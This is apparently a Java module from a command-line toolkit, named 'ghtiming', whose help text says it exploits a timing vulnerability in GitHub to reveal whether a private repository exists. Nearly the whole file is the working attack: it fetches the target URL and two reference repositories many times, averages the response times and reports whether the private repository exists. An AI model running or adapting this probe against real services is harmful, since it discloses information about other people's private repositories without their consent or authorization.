package modules;

import core.*;

import java.util.*;
import java.util.regex.*;
import java.net.*;
import org.apache.http.util.*;
import org.apache.http.client.*;
import org.apache.http.cookie.*;
import org.apache.http.client.methods.*;
import org.apache.http.client.protocol.*;
import org.apache.http.impl.client.*;
import org.apache.http.message.*;
import org.apache.http.*;
import org.apache.http.client.entity.*;
import java.text.Collator;
import java.io.*;

public class ModuleGHTiming extends Module {
    public ModuleGHTiming() {
        super();
        register("ghtiming", "githubtiming", "timing", "expose", "xpose", "ght", "githubt");
    }

    // when module is run
    @Override
    public void run(RunConfiguration config) {
        if(config.getArray().length != 1) {
            final String repo = config.getArray()[1];
            boolean success = false;
            try {
                new URL(repo);
                success = true;
            } catch(Exception e) {
                success = false;
            }
            if(!repo.contains("github.com") || !success) {
                report(Status.ERROR, "Invalid repository URL supplied.");
                report(Status.INFO, "sample url: https://github.com/Arinerron/pfc");
            } else {
                Logger.liveupdate = true;

                Logger.livestring = "Establishing a timing baseline for repos...";

                List<Double> existsdata = new ArrayList<>();
                List<Double> nonexistsdata = new ArrayList<>();
                List<Double> realdata = new ArrayList<>();
                boolean flip = true;
                for(int i = 0; i < 15; i++) {
                    long before = System.currentTimeMillis();
                    try {
                        getContent(repo);
                    } catch(Exception e) {}
                    long after = System.currentTimeMillis();
                    realdata.add((double)((double)(after - before)));
                }
                for(int i = 0; i < 30; i++) {
                    long before = System.currentTimeMillis();
                    try {
                        getContent("https://github.com/Arinerron/" + (flip ? "privaterepo" : "ajhsdfgffd"));
                    } catch(Exception e) {}
                    long after = System.currentTimeMillis();
                    (flip ? existsdata : nonexistsdata).add((double)((double)(after - before)));

                    flip = !flip;
                }
                for(int i = 0; i < 15; i++) {
                    long before = System.currentTimeMillis();
                    try {
                        getContent(repo);
                    } catch(Exception e) {}
                    long after = System.currentTimeMillis();
                    realdata.add((double)((double)(after - before)));
                }

                double total = 0;
                for(Double d : existsdata)
                    total = total + d;
                double exist = (double)(total / existsdata.size());
                total = 0;
                for(Double d : nonexistsdata)
                    total = total + d;
                double nonexist = (double)(total / nonexistsdata.size());
                total = 0;
                for(Double d : realdata)
                    total = total + d;
                double real = (double)(total / realdata.size());

                Logger.liveupdate = false;

                report(Status.CLEARLINE, null);
                report(Status.INFO, "real:" + real + " & exist:" + exist + "& nonexist:" + nonexist);
                if(Math.abs(exist - real) > Math.abs(nonexist - real))
                    report(Status.INFO, "Repository " + config.getArray()[1] + " does not exist.");
                else
                    report(Status.INFO, "Repository " + config.getArray()[1] + " exists.");
            }
        } else
            help();
    }

    // when help is displayed
    @Override
    public void help() {
        report(Status.HELP, "Exploits a timing vulnerability in GitHub to expose whether or not a given private repository exists");
        report(Status.HELP, "syntax: ghtiming <GH_URL>");
    }

    // returns the content of a page at a url in a String
    public static String getContent(String page) throws Exception {
        URL url = new URL(page);
        InputStream is = url.openStream();
        int ptr = 0;
        StringBuffer buffer = new StringBuffer();
        while ((ptr = is.read()) != -1) {
            buffer.append((char)ptr);
        }

        return buffer.toString();
    }
}
